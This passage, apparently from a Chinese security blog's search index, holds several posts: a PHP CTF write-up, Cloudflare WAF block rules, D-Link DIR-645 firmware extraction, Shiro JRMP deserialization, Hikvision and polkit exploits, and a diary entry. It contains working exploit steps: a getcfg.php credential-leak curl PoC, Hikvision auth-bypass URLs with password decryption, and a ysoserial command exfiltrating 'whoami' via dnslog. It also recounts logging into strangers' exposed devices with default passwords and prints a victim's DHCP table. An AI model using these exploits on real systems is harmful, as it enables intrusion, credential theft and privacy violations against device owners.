D0iVVRGLTgiPgo8P3BocAogICAgaW5jbHVkZSAnLi9mbGFnLnBocCc7CiAgICBlcnJvcl9yZXBvcnRpbmcoMCk7CiAgICAkcGFyMSA9ICRfR0VUWydwYXIxJ107CiAgICAkcGFyMiA9ICRfR0VUWydwYXIyJ107CiAgICAkcGFyMyA9ICRfUE9TVFsncGFyMyddOwogICAgJHBhcjQgPSAkX1BPU1RbJ3BhcjQnXTsKICAgIGlmIChpc3NldCgkcGFyMSkmJmlzc2V0KCRwYXIyKSYmaXNzZXQoJHBhcjMpJiZpc3NldCgkcGFyNCkpIHsKICAgICAgICBpZiAoJHBhcjEgPT09ICRwYXIyICYmIG1kNSgkcGFyMSkgIT09IG1kNSgkcGFyMikpIHsKICAgICAgICAgICAgZGllKCfov5jmg7Por7vlj5ZmbGFn77yfJyk7CiAgICAgICAgfQogICAgICAgIGlmIChoYXNoKCJtZDQiLCAkcGFyMykgPT0gaGFzaCgibWQ0IiwgJHBhcjQpKSB7CiAgICAgICAgICAgIGVjaG8gJ+e7meS9oGZsYWfvvIEnIC4gJGZsYWc7CiAgICAgICAgfQogICAgfQo=|base64-d#secure.php:&lt;metacharset=\"UTF-8\"&gt;&lt;?phpinclude'./flag.php';error_reporting(0);$par1=$_GET['par1'];$par2=$_GET['par2'];$par3=$_POST['par3'];$par4=$_POST['par4'];if(isset($par1)&amp;&amp;isset($par2)&amp;&amp;isset($par3)&amp;&amp;isset($par4)){if($par1===$par2&amp;&amp;md5($par1)!==md5($par2)){die('还想读取flag？');}if(hash(\"md4\",$par3)==hash(\"md4\",$par4)){echo'给你flag！'.$flag;}}从代码可以看到直接传入的四个参数GET：par1&amp;par2，POST：par3&amp;par4；判断：if(isset($par1)&amp;&amp;isset($par2)&amp;&amp;isset($par3)&amp;&amp;isset($par4))设置四个参数即可；if($par1===$par2&amp;&amp;md5($par1)!==md5($par2))与判断，直接不满足其中一个条件即可；比如让两个参数不相等或两个参数的md5值不相等；继续往下：if(hash(\"md4\",$par3)==hash(\"md4\",$par4))两个参数的md4值相等给出flag；不多说，直接上payload：#0x03卖瓜这道题对于当下的我来说还是比较难，是看了题解才做得出来；究其原因我觉得是由于代码基础太过薄弱的缘故，就拿这道题来说，就算是找到PHP文档:Integer整型，下一次遇到这样的题目还是没有办法。题目描述：有一个人前来买瓜。HQ：哥们，这瓜多少钱一斤啊？你：两块钱一斤。HQ：What'sup！这瓜皮子是金子做的还是瓜粒子是金子做的？你：你瞧瞧现在哪有瓜啊？这都是大棚的瓜，只有6斤一个和9斤一个的，你嫌贵我还嫌贵呢。（HQ心里默默一算）HQ：给我来20斤的瓜。你：行！HQ：行？这瓜能称出20斤吗？你：我开水果摊的，还不会称重？HQ：我问你这瓜能称出20斤吗？你：你是故意找茬，是不是？你要不要吧！HQ：你这瓜要是刚好20斤吗我肯定要啊。那它要是没有怎么办啊？你：要是不是20斤，我自己吃了它，满意了吧？（你开始选瓜称重）补充说明：当称的数字变为浮点数而不是整数时，HQ不会认可最终的称重结果。题目描述看完就可以得到方程：6x+9y=20；我的第一反应是尝试能否负数来解题；而事实上并不可以:D实际上，题目解题思路是没有问题的，我们可以看到上面标红的补充说明，因为我们知道上面的方程x和y是没有整数解的，所以基本思路就是通过Int型与Float型的数在PHP中的转换来使的正负相加得到一个固定的数，下面来谈谈这道题；我们先来整理一下关键的点：Server:nginx/1.21.3、X-Powered-By:PHP/8.0.10；POSTmethod:b6=1&amp;b9=1，b6参数代表6斤的瓜，b9代表9斤的瓜；提出问题：1、PHP8是否有这样的机制导致可以溢出为负整数呢？答：可以，PHP文档:Integer整型2、如果有的话，回到这道题上来，在没有给出代码的情况下如何利用呢？针对问题1，我参考文档给出的代码做了一些本地实验方便理解：如果给定的一个数超出了int的范围，将会被解释为float。同样如果执行的运算结果超出了int范围，也会返回float。如下图：当从浮点数float转换成整数int时，将向下取整。"
  },

  {
    "title"    : "ModSec & CloudFlare WAF Initial Research",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/WAF-developed-by-Grayscale-forwarding/",
    "date"     : "Jul 22, 2021",
    "content"  : "[持续更新]ModSec&amp;CloudFlareWAFInitialResearch零：CloudFlareWAF最近在研究web防火墙，看到CloudFlare有现成的云WAF供使用，于是就研究了研究，自定义了一些自己需要的web拦截规则。所需：域名域名对应解析IP开放WEBServerCloudFlare帐号注册即可一般步骤为：假设您的域名购买服务商为阿里云；1.登录阿里云域名面板设置解析IP；2.阿里云域名面板DNSServer修改为：diva.ns.cloudflare.comnitin.ns.cloudflare.com3.进入CloudFlare，添加站点，添加CloudFlare指定认证页面添加到Webroot目录下；4.配置WAF。#0x01解析IP云解析DNS-阿里云#0x02自定义DNSServer把DNS解析服务器解析成步骤2即可；步骤3同样根据页面引导操作即可，此处不做演示。#0x03CloudFlareWAFconfig进入CloudFlare主页，点击域名{domain.info}-&gt;防火墙-&gt;添加筛选器firewall:https://dash.cloudflare.com/{random-token-value}/{domain.value}/firewall在配置过滤器时，我针对个人需求和当前攻击行为进行了一些思考：对一个静态站点来说，很明显我们对外提供WEB服务只用到GET请求，没有其他请求，所以我就把POST添加到了黑名单内：(http.request.methodeq\"POST\")值得一提的是：您需要注意如果您添加的是根域名a.comDNS服务器为CloudFlare，那么firewall将会作用于所有可识别的域名如1.a.com&amp;2.a.cometc…针对文件读取payload的黑名单：(http.request.uri.pathcontains\"etc/passwd\")➜bin4xinsrccurlhttps://about.sentrylab.cn/etc/passwd-IHTTP/2403date:Fri,23Jul202102:05:34GMTcontent-type:text/plain;charset=UTF-8content-length:16x-frame-options:SAMEORIGINcache-control:private,max-age=0,no-store,no-cache,must-revalidate,post-check=0,pre-check=0expires:Thu,01Jan197000:00:01GMTcf-request-id:0b72b571c10000ead3f0a9d000000001expect-ct:max-age=604800,report-uri=\"https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct\"report-to:{\"endpoints\":[{\"url\":\"https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=M5QRiSM6AQIHABiTpenP95FWMk%2FHuRnQpjqIQ9WDX0d%2FM9fI6nr0TpYUtThWUa64GPpRP%2Baubtxi4kHZ7UYNvA%2BXuhkeX73zKJLD6JtsWWRb96yS3KbdotjjJMqBX6%2F9DFUFfQU%3D\"}],\"group\":\"cf-nel\",\"max_age\":604800}nel:{\"report_to\":\"cf-nel\",\"max_age\":604800}server:cloudflarecf-ray:6731582f792aead3-LAXalt-svc:h3-27=\":443\";ma=86400,h3-28=\":443\";ma=86400,h3-29=\":443\";ma=86400,h3=\":443\";ma=86400目录遍历payload黑名单：(http.request.uri.pathcontains\".\")or(http.request.uri.pathcontains\"%2e\")or(http.request.uri.pathcontains\"%252e\")在此处您需要注意访问url中的特殊字符如/、&amp;，否则会导致WAF误报当然规则库还支持传入请求匹配：Cookie、国家/地区、URI查询字符、URI路径、爬虫机器人等，可根据需求进行自定义。#0x04带有攻击性的流量一：LocalWAF-JXWAF1.手动安装-1x01至1x032.自动安装-JXWAF-README.MD参考centos.orgVMware安装Centos7系统*Tips:新安装的Centos须修改：/etc/sysconfig/network-scripts/ifcfg-{interface}中的onboot选项为yes-&gt;ifconfig-l-&gt;lo0eth0-&gt;{interface}=eth0#1x01Lua接入测试openrestyinstall$yuminstall-yreadline-develpcrepcre-developensslopenssl-develgcccurlGeoIP-develwgetperl$wgethttps://openresty.org/download/openresty-1.15.8.3.tar.gz$tar-xvfopenresty-1.15.8.3.tar.gz$cdopenresty-1.15.8.3$./configure-j2$make-j2$sudomakeinstallLuadebug$viHelloWorld.luaprint(\"HelloWorld!\")$luaHelloWorld.luaHelloWorld!openrestyconf[bin4xin@ingeekopenresty]$pwd/usr/local/openresty$vinginx/conf/nginx.conf#nginx.confworker_processes1;events{worker_connections1024;}http{lua_code_cacheoff;server{location/test{default_type'text/plain';content_by_lua_file'/opt/lua/test.lua';}}}$sudobin/openresty-tnginx:[alert]lua_code_cacheisoff;thiswillhurtperformancein/usr/local/openresty/nginx/conf/nginx.conf:39nginx:theconfigurationfile/usr/local/openresty/nginx/conf/nginx.confsyntaxisok$ps-ef|grepopenroot179031023:17?00:00:00nginx:masterprocessbin/openresty$cat/opt/lua/test.lua#test.lualocalname=\"Anonymous\"ngx.say(\"Hello,\",name,\"!\")ngx.say(\"test\")至此规则关联完毕，测试：$curllocalhost/testHello,Anonymous!test#1x02openresty接入JXWAF接入可以参考：JXWAF-README.MD#1x03接入效果实现基本的webhttp应用协议恶意流量包的拦截自定义403等页面自定义规则库"
  },

  {
    "title"    : "Router-BinFile-Analysis",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Router-BinFile-Analysis/",
    "date"     : "Jul 8, 2021",
    "content"  : "本文主要记录了Router固件提取的过程，丰富相关从业方向的经验；也是第一个跟着教程提取出的固件，过程有些曲折，分享一些心路历程和提取思路。VMUbuntu18Binwalkfirmware-mod-kitUbuntu本地VM镜像安装、换源什么的就不赘述了；需要了解的朋友移步搜索引擎；零：DLink-DIR645A1_FW102B08下载地址：DLink-ftp.dlink.runode下载bin后缀的文件；路由器固件可以理解为一个嵌入式系统，是路由器所使用的操作系统；我们日常中使用的像本文中提及到的Ubuntu18在虚拟机中运行占用容量动辄2G以上，路由器主要功能为拨号、无线等上网用途，功能较为单一，所以主流Linux/BSD发行版镜像则不适用；所以市面上有很多魔改的、适用于路由器的嵌入式系统；基于LinuxOpenWrtCommotionWirelessDebWRTHyperWRTPadavan…基于BSDUnix内核FreeBSD-自由及开放源代码操作系统（采用BSD授权条款）zrouterBSDRouterProjectm0n0wallpfsenseOPNsense背景就介绍一些，有兴趣可以移步WIKIPEDIA[1]所以此时我们就拿到了DIR645A1_FW102B08版本的固件，拿到快递的第一步当然是拆快递；0x01：手动提取hsqssystemfilesTips：Squashfs（.sfs）是一套供Linux核心使用的GPL开源只读压缩文件系统，具有超高压缩率，其压缩率最高可达34%。手动判断文件类型：1)strings|grep检索文件系统magic签名头2)hexdump|grep检索magic签名偏移3)dd|file确定magic签名偏移处的文件类型#Whyhsqs?问：为什么是在文件中检索hsqs？回答：可识别字符特征例如我们可以通过JSESSIONIDCOOKIE来判断出这是一个J2EE系统，但是我们并不能判断这个系统是否集成了ApacheShiro，所以我们需要进一步通过rememeberMeCOOKIE来判断，更有甚者则需要通过人工来寻找路由判断；所以此处的文件类型判断同样，文件系统magic签名头是指一个文件系统中包含的一串可识别字符，有了这串字符，表明该文件可能包含某个文件系统；当然，如果要确定是否包含某文件系统，还需要利用其他条件配合证明，也就是2、3步骤需要做。#寻找这个快递的运单:)➜stringsDIR645A1_FW102B08.bin|grep\"hsqs\"hsqs➜hexdump-CDIR645A1_FW102B08.bin|grep-n\"hsqs\"88066:0016009068737173a30700002964cc4e00000100|hsqs....)d.N....|在偏移0x160090发现了hsqs，16进制转化为10进制得1441936，复制签名偏移的文件类型大小≤100bytes即可：Tips：通常复制100字节的数据，是因为squashfs文件系统的头部校验不会超过100字节简而言之：此处提取出来的100字节大小的squash可以类比成快递运单，运单上详细记录着快递类型、快递大小等托运物相关信息；➜ddif=DIR645A1_FW102B08.binbs=1count=100skip=1441936of=squash100+0recordsin100+0recordsout100bytescopied,0.0387127s,2.6kB/s➜filesquashsquash:Squashfsfilesystem,littleendian,version4.0,5958022bytes,1955inodes,blocksize:65536bytes,created:WedNov2303:10:332011我们看到运单显示：类型Squashfsfilesystem，大小5958022bytes，创建时间WedNov2303:10:332011，当然这也是我们下一步所需要的参数；ddif=DIR645A1_FW102B08.binbs=1count=5958022skip=1441936of=kernel.squash命令输出数据文件#打开快递盒子:)用到的工具：firmware-mod-kit$gitclonehttps://github.com/mirror/firmware-mod-kit.git$sudoapt-getinstallbuild-essentialzlib1g-devliblzma-devpython-magic$cdfirmware-mod-kit/src$./configure&amp;&amp;make#这里顺便一提：ln:failedtocreatehardlink'uncomp_r.c'=&gt;'uncomp.c':Operationnotpermitted#报错是操作不被允许，因为我图省事宿主机共享了一个文件夹给虚拟机，make操作都是在共享文件夹下，导致权限存在问题$makeclean$mvfirmware-mod-kit/*~/Desktop/firmware-mod-kit/&amp;&amp;cdfirmware-mod-kit/src$./configure&amp;&amp;make#紧接着直接对kernel.squash进行解包即可$cd../&amp;&amp;./unsquashfs_all.sh../kernel.squash上图红字步骤依次从上到下：1.successinlocalfold.2.makeerror:ln:failedtocreatehardlink‘uncomp_r.c’=&gt;‘uncomp.c’:Operationnotpermitted.3.提取成功0x02Binwalk提取hsqssystemfiles$binwalk-MeDIR645A1_FW102B08.bin$cd_DIR645A1_FW102B08.bin.extracted/$/{path/to/firmware-mod-kit}/unsquashfs_all.sh160090.squashfs同样解出；图片红字步骤依次从上到下：1.binwalk解出.squashfs文件后需手动使用unsquashfs_all脚本解包2.两种方法之间的过程比较0x03DIR-645敏感信息泄露htdocs/web/getcfg.phpHTTP/1.1200OKContent-Type:text/xml&lt;?echo\"&lt;?\";?&gt;xmlversion=\"1.0\"encoding=\"utf-8\"&lt;?echo\"?&gt;\";?&gt;&lt;postxml&gt;&lt;?include\"/htdocs/phplib/trace.php\";if($_POST[\"CACHE\"]==\"true\"){\techodump(1,\"/runtime/session/\".$SESSION_UID.\"/postxml\");}else{\t/*cut_count()willreturn0whennooronlyonetoken.*/\t$SERVICE_COUNT=cut_count($_POST[\"SERVICES\"],\",\");\tTRACE_debug(\"GETCFG:got\".$SERVICE_COUNT.\"service(s):\".$_POST[\"SERVICES\"]);\t$SERVICE_INDEX=0;\twhile($SERVICE_INDEX&lt;$SERVICE_COUNT)\t{\t\t$GETCFG_SVC=cut($_POST[\"SERVICES\"],$SERVICE_INDEX,\",\");\t\tTRACE_debug(\"GETCFG:serivce[\".$SERVICE_INDEX.\"]=\".$GETCFG_SVC);\t\tif($GETCFG_SVC!=\"\")\t\t{\t\t\t$file=\"/htdocs/webinc/getcfg/\".$GETCFG_SVC.\".xml.php\";\t\t\t/*GETCFG_SVCwillbepassedtothechildprocess.*/\t\t\tif(isfile($file)==\"1\")dophp(\"load\",$file);\t\t}\t\t$SERVICE_INDEX++;\t}}?&gt;&lt;/postxml&gt;Poc:curl-d\"SERVICES=DEVICE.ACCOUNT&amp;attack=ture%0aAUTHORIZED_GROUP=1\"\"http://{ip.addr}:{ip.port}/info/getcfg.php\"一：H3C-AM8000V100R008下载地址：H3C-AM8000V100R0081x01binwalk提取systemfiles官网显示是2015年上传的包，下载下来直接在ubuntu里解包➜binwalk-MeAM8000V100R008.bin，尴尬的是所有的文件就直接出来了么发现shadow，解出来看看：➜john-format=md5crypt{file/path}&amp;&amp;john--show{file/path}1x02默认帐号密码fofa:userLogin.asp既然有了默认账号密码，去找找看有没有幸运儿，查看web.config入口文件为userLogin.asp，那就直接指定语法；#来自杭州的幸运儿不光弱口令，还映射了n个内网端口到公网上，映射出来的端口是Hikvison的视频流端口和web管理，就不贴图了可以参考Hikvision-ConfigurationFiles-decrypter；另外附上部分dhcp指向表自行感受一下：5\tF4:83:CD:00:62:CD\t192.168.x.7\tTL-WDR56006\t18:87:40:96:43:7F\t192.168.x.8\tRedmiK305G-25107\t58:6B:14:26:B4:4C\t192.168.x.9\tguoqingdeiPhone8\t4C:CC:6A:AA:D0:45\t192.168.x.10\twp-pjb9\t74:27:EA:AC:44:2D\t192.168.x.11\tyjy-jcb10\t40:F2:E9:37:04:96\t192.168.x.13\tIMM2-40f2e93704当然也是支持telnet连接的：[未完待续…]参考路由器文件系统与提取squashFS文件系统路由器固件下的小试牛刀"
  },

  {
    "title"    : "© 哨兵Sentry Security相关技术栈简介",
    "category" : "",
    "tags"     : "笔记, wiki",
    "url"      : "/top/2021/Jekyll-site-routers-and-config/",
    "date"     : "Jul 7, 2021",
    "content"  : "[2021/11/09/15:08:59]:本文主要介绍©哨兵SENTINELSECURITY,LAB相关主题源码的路由、相关配置等更多参考此链接以快速开始"
  },

  {
    "title"    : "JRMP-Gadget",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/JRMP-Gadget/",
    "date"     : "Jun 30, 2021",
    "content"  : "Shiro框架深入利用：JRMP-Gadget利用链浅析PartI:StayHungry,StayFoolish.PartII:学的越多，不懂得也就越多。*2021年6月30日星期三15时30分40秒CST前不久，Fofa安全工程师某信正在愉快的网上冲浪，不一会群里丢出了一个惹眼的链接吸引了某信的注意。链接格式：http://{ip.addr}:{ip.port}/a/login芽儿～当时我整个人的是这样的：因为这个链接实在是太熟悉了，浏览器访问，果然直接跳转：/a/login;JSESSIONID=···和具有辨识度的Cookie：jeesite.session.id一切都是这么的自然，我可真是太神气了。梳理一下：Shiro框架JeesiteCMS已知路由/a/、/f/…所以这个站就可以直接从Shiro入手来看，老三样：跑密钥-&gt;利用链-&gt;Dnslog不过跑密钥出了个小插曲，登录路由login处设置rememberMeCookie时反包Set-Cookie不显示deleteMeCookie，具体原因待更新：DifferentShiroFrameworkdeserializationanalysisideas，而从上面的特征我们已经可以肯定存在Shiro框架，当然也可以通过对不存在的路由进行Cookie设置来进行验证。由于上面的原因导致有一些匹配回包来检测shiro框架为逻辑工具就在原地划水不动弹，不慌，总有一些“尖子生”，跑出默认密钥：kPH+bIxk5D2deZiIxcaaaA==紧接着：[*]find:JRMPClientcanbeuse0:JRMPClientysoserial.jar公网起JRMP端口，转发命令ping`whoami`.x.dnslog.cnJRMP监听显示流量建立链接，查看dnslog：默认加密密钥-&gt;JRMPClient利用链-&gt;Shiro反序列化RCEroot多么赏心悦目，一切都是那么地丝滑。\t\t\t\t然而却帅不过三秒：\t\t\t提出问题其实在这次渗透的过程中，我对于两个地方存疑：第一个问题是开发向：就是Shiro框架识别阶段，/a/login路由配置Shiro对应Cookie后没有返回对应的Set-Cookie，如何实现的？同时我这里查了一些资料供参考ApacheShiro反序列化识别那些事第二个问题是JRMPGadget利用阶段，为什么Dnslog记录显示为root，而现实情况下反弹的shell权限则是低权限？#为什么不是root?如上图，整张图是我个人对于Java反序列化中对于JRMP利用链的过程理解，从localAttacker环节开始，具体细节在这里不做展开叙述，其中存在歧义的地方我使用红色部分进行了标记；个人分析存在的问题也是红色部分：VPS-JRMP阶段在服务器启动的时候命令为：java-cpysoserial.jarysoserial.exploit.JRMPListener3333CommonsCollections5\"ping`whoami`.x.dnslog.cn\"对应的：ysoserial.exploit.JRMPListener利用类、3333本地JRMP监听端口、CommonsCollections5Java反序列化利用链以及转发\"ping`whoami`.x.dnslog.cn\"命令再来看另外一张图片：我们看上面这一张图，重点在于pingroot.zj6u6s.dnslog.cn进程对应的用户同样是低权限用户，也就是说是低权限的用户去运行的`whoami`这个命令而且输出的是root，但是从Linux权限的常识来看是不会出现这样的情况的。所以有了以下设想：我初步的设想是：假设1:命令是在受害机器上执行，那么有几种情况：1.1:会不会因为该用户是sudo用户才导致返回的dns记录为root？1.2:启动Tomcat服务的为root用户？（通过ps-ef可以直接排除，而且细想，若Tomcat用户为root，那么肯定反弹的用户也为root）所以我针对1.1假设进行了实验进行正确型验证：➜bin4xinsudo-lUserbin4xinmayrunthefollowingcommandsonbin4xin'sMacbookPro:(ALL)ALL➜bin4xin(sudo)ping`whoami`.31veg3.dnslog.cnPINGbin4xin.31veg3.dnslog.cn(127.0.0.1):56databytes64bytesfrom127.0.0.1:icmp_seq=0ttl=64time=0.087ms64bytesfrom127.0.0.1:icmp_seq=1ttl=64time=0.163ms我们可以通过上面的bash信息和下面的dnslog信息返回看到，与sudo用户无关#是否添加sudo返回都如下：#dnslog返回记录bin4xin.31veg3.dnslog.cn\t61.132.161.4\t2021-07-0513:44:34bin4xin.31veg3.dnslog.cn\t61.132.161.6\t2021-07-0513:44:34所以这种假设我们就直接排除了；第二种设想假设2:命令是在VPS机器上执行，就是JRMP利用过程链那张图中红色的那一部分，我想：\"ping`whoami`.x.dnslog.cn\"命令转发前本地机器是否已经执行了whoami所以导致了受害机器执行的是root开头的命令呢？那么如果通过这种假设，过程就是：JRMPServerListen:*0.0.0.0:3333-&gt;本地机器执行`whoami`受害机器访问JRMPServer，执行pingroot.x.dnslog.cn。这种情况下来看，实际上也能够说通，而实际上也正是如此，本来打算是在本地跑个Shiro走一整个流程的，但是直到我发现了这个：➜bin4xinjava-cpysoserial-0.0.6-SNAPSHOT-BETA-all.jarysoserial.exploit.JRMPListener8888CommonsCollections3\"ping`whoami`.6iep0z.dnslog.cn\"*OpeningJRMPlisteneron8888#ysoserial.exploit.JRMPListener利用类监听状态下：➜bin4xinps-ef|grepping5016895669602:37下午ttys0040:00.54java-cpysoserial.jarysoserial.exploit.JRMPListener8888CommonsCollections3pingbin4xin.6iep0z.dnslog.cn看到java-cpysoserial.jarysoserial.exploit.JRMPListener8888CommonsCollections3pingbin4xin.6iep0z.dnslog.cn进程一切已然清晰；至此，本章核心阐述完毕。以上"
  },

  {
    "title"    : "Hikvision-ConfigurationFiles-decrypter",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Hikvision-ConfigurationFiles-decrypter/",
    "date"     : "Jun 29, 2021",
    "content"  : "HikvisionConfigurationFilesUnauthfofa：app=”HIKVISION-视频监控”HIKVISION监控设备管理后台存在未授权，通过构造url可绕过登录查看监控，检索所有用户和配置文件下载。构造url主要是通过如下的auth参数构造生成base64加密字段，如下所示：➜echoadmin:11|base64YWRtaW46MTEK检索所有用户及其角色的列表http://{ip.addr}:{ip.port}/Security/users?auth=YWRtaW46MTEK返回xml信息：&lt;UserListversion=\"1.0\"&gt;&lt;Userversion=\"1.0\"&gt;&lt;id&gt;1&lt;/id&gt;&lt;userName&gt;admin&lt;/userName&gt;&lt;priority&gt;high&lt;/priority&gt;&lt;ipAddress&gt;0.0.0.0&lt;/ipAddress&gt;&lt;macAddress&gt;00:00:00:00:00:00&lt;/macAddress&gt;&lt;userLevel&gt;Administrator&lt;/userLevel&gt;&lt;/User&gt;&lt;/UserList&gt;下载账号密码配置文件http://{ip.addr}:{ip.port}/System/configurationFile?auth=YWRtaW46MTEK➜fileconfigurationFileconfigurationFile:PGPSecretKey-如上，我们配置文件下载完成后可以看到是PGP加密文件，所以我们需要对文件进行解密才可以找到账号密码的配置信息；文件解密出的账号密码就是监控设备后台管理的账号密码信息，我们得到信息直接登录即可。解密软件用法及链接如下：#Usage:Open[hikvision-decrypter.exe]onWindowsplatform:OpenConfigurationFile-&gt;Encrypted-&gt;DecryptData(DecryptingAES...)-&gt;(Successfullydecrypteddata)-&gt;SaveConfigurationFile.#Findpassindecrypteddata用010-Editor程序打开decrypteddata文件.文件内搜索admin字符串，如左图；Boom!Easytofindpassword!(admin:asdf1234)*我们通过[Usage]来获得的帐号密码登录即可，有机会会从代码角度分析一下为什么存在未授权访问#相关链接一览表DescLinkDownloadHikvisionexechikvision-decrypter.exeandhereis:ReposDownloadconfigurationFileSampleconfigurationFileDownloadconfigurationFiledecry-SampleconfigurationFile-decry获取监控快照http://{ip.addr}:{ip.port}/onvif-http/snapshot?auth=YWRtaW46MTEK当前时间下监控的快照图片参考CVE-2017-7921海康威视摄像头管理后台未授权HikvisionDecrypter以上。"
  },

  {
    "title"    : "安庆除草",
    "category" : "daily",
    "tags"     : "",
    "url"      : "/daily/2021/Weeding-in-Anqing/",
    "date"     : "Jun 27, 2021",
    "content"  : "狗尾草（学名：Setariaviridis），又名绿狗尾草、谷莠子、狗尾巴草。一年生草本植物；秆直立或基部膝曲，高30-100厘米；叶片扁平，狭披针形或线状披针形；圆锥花序紧密呈圆柱形，刚毛粗糙，通常绿色或褐黄色。同属植物常见的还有：大狗尾草（Setariafaberi）等。狗尾草是小米的祖先。与之外形相近的金色狗尾草（原S.glauca，现Pennisetumglaucu）已经移入狼尾草属，与之非同属植物。狗尾草的种子适生性强，耐旱耐贫瘠，在酸性或碱性土壤均可生长，常见于农田、路边、荒地。全球分布广泛，中国各地均有分布，为常见主要杂草。麦类、稻类、玉米、旱作物易受其侵害，与作物争夺肥力能力强，造成作物减产。一次偶然的机会，乘着工作回到安庆——这一次是来自安庆教体行业的攻防演练，当然：本地化队伍竞争起来还是很吃力的，不过第一的结果也能证明这一年来的成果、进步；忙里偷闲，演练结束随后第二天跟着老头子回了趟老家。#老房子每次回老家鼻腔内总是充满了腐败的味道，水泥、灰尘、蜘蛛网，一切一切的腐败气息总是会让人想到下雨天，不知为何我总是很享受雨夜，直到看到了这句：我们的祖先在雨夜感到安全，因为雨夜野兽鲜少出来觅食，这样的倾向随基因保留在我们的大脑深处，让我们在雨夜有安全感。"
  },

  {
    "title"    : "Polkit-CVE-2021-3560",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/polkit-CVE-2021-3560/",
    "date"     : "Jun 16, 2021",
    "content"  : "YouTubeBiliBili不良视频反馈&nbsp;|&nbsp;Inappropriatevideofeedback.原视频中，漏洞发现人[@KevinBackhouse]简单介绍漏洞原理后对漏洞进行手动复现；而我们需注意的是：相关脚本1用法：bashpolkit-CVE-2021-3560.shusernamepasswd*Tips：详细视频可点击原视频链接观看，或者：BiliBili-CVE-2021-3560Linux提权漏洞复现2尽管用作者的话来说是Thevulnerabilityenablesanunprivilegedlocalusertogetarootshellonthesystem.It’seasytoexploitwithafewstandardcommandlinetools而对于漏洞复现本身而言，我们似乎并不能百分百触发漏洞如果我们没有找到窍门，正如作者说的：Iliketothinkthatit’stheoreticallypossibletotriggerbysmashingCtrl+Catjusttherightmoment,butI’veneversucceeded,soIdoitwithasmallamountofbashscriptinginstead.Youmightneedtorunthatafewtimes,andyoumightneedtoexperimentwiththenumberofmillisecondsinthedelay所以有了本文。漏洞简介该漏洞存在于系统服务Polkit中，因为Polkit被Systemd所调用，因此默认安装了Systemd的发行版都会使用Polkit；该漏洞成因是执行dbus-send命令后在认证完成前强制终止引发错误，而Polkit未正确处理错误导致允许无特权的用户添加一个sudo用户。dbus&amp;polkit交互流程图[*Tips：来源图见下方参考]3虚线上方的两个进程——dbus-send和AuthAgent是非特权用户进程。线下的那些是特权系统进程。中间是dbus-daemon，它处理所有的通信：其他四个进程通过发送D-Bus消息来相互通信。dbus-daemon在polkit的安全性中扮演着非常重要的角色，因为它使四个进程能够安全地通信并检查彼此的凭据。例如，当AuthAgent向polkit发送身份验证cookie时，它会通过将其发送到org.freedesktop.PolicyKit1D-Bus地址来实现。由于该地址仅允许由根进程注册，因此不存在非特权进程拦截消息的风险。我们从左边箭头指向方向到右边一个凹字形来看流程：4dbus-send命令行后台请求dbus-daemon守护程序然后转发告诉account-daemondbus-send程序请求account-daemon守护程序收到请求返回确认字给dbus-daemon，同时告知polkit（我们的主角）account-daemon从dbus-send接收D-Bus消息，该消息包括发送者的唯一总线名称。polkit返回dbus-daemon守护程序确认请求，最终到达AuthAgent认证端polkit向dbus-daemon询问连接的UID如果连接的UID为’0’，则polkit立即授权该请求。否则，它会向身份验证代理发送允许授权请求的管理员用户列表。身份验证代理打开一个对话框以从用户那里获取密码。身份验证代理将密码发送给polkit，polkit将“是”回复发送回帐户守护程序，account-daemon创建新的用户帐户。显而易见：问题流程在最后一段，我们通过漏洞发现者博客已知关键在于Kill掉dbus-send命令导致了身份验证绕过，为什么？换而言之，漏洞出现在第三步骤的第二小步，挖掘思路是什么？在此之前我们简单了解一下polkit，我认为可以把它想像成sudo认证机制的可视化界面，当我们的当前操作需要更多权限时那么就会触发polkit的认证机制：pkexec$pkexecid====AUTHENTICATINGFORorg.freedesktop.policykit.exec===Authenticationisneededtorun`/usr/bin/id'asthesuperuserAuthenticatingas:bin4xin,,,(ingeek)Password:polkit-agent-abouter-1:errorresponsetoPolicyKitdaemon:GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed:Nosessionforcookie====AUTHENTICATIONFAILED===Errorexecutingcommandasanotheruser:NotauthorizedThisincidenthasbeenreported.#pkexecwhoamiroot作者提到：在第三步骤的第一小步中询问dbus-daemon的函数中代码存疑：staticgbooleanpolkit_system_bus_name_get_creds_sync(PolkitSystemBusName*system_bus_name,guint32*out_uid,guint32*out_pid,GCancellable*cancellable,GError**error)具体的代码分析可以参考原博客，我们这里就不做不过多的搬运和翻译。所以如上我们可以得到的是polkit在询问dbus-daemon过程中未进行错误检查，导致在运行质询的过程中可以通过一些可控手段绕过认证机制：Thebugisinthissnippetofcodeincheck_authorization_sync:Noticethatthevalueoferrorisnotchecked.Poc代码需解决的如下：重复运行payload，函数检测是否添加用户payload是否成功；修改payload，计算killpolkit进程的时间；输出添加成功帐号密码。Poc代码实验环境Ubuntu20.04ingeek@ubuntu:~$/etc/init.d/dbusstatus●dbus.service-D-BusSystemMessageBusLoaded:loaded(/lib/systemd/system/dbus.service;static;vendorpreset:enabled)Active:active(running)sinceTue2021-06-1523:00:47PDT;1h26minagoTriggeredBy:●dbus.socketDocs:man:dbus-daemon(1)MainPID:875(dbus-daemon)Tasks:1(limit:4618)Memory:5.4MCGroup:/system.slice/dbus.service└─875/usr/bin/dbus-daemon--system--address=systemd:--nofork--参考以上。hakivvi/CVE-2021-3560 &#8617;CVE-2021-3560Linux提权漏洞复现 &#8617;Privilegeescalationwithpolkit:HowtogetrootonLinuxwithaseven-year-oldbug &#8617;Linuxsystemservicebugletsyougetrootonmostmoderndistros &#8617;"
  },

  {
    "title"    : "scylla 搭建步骤",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Thousand-people-Thousand-faces-Red-team-penetration-agent-pool-based-on-scylla/",
    "date"     : "Jun 4, 2021",
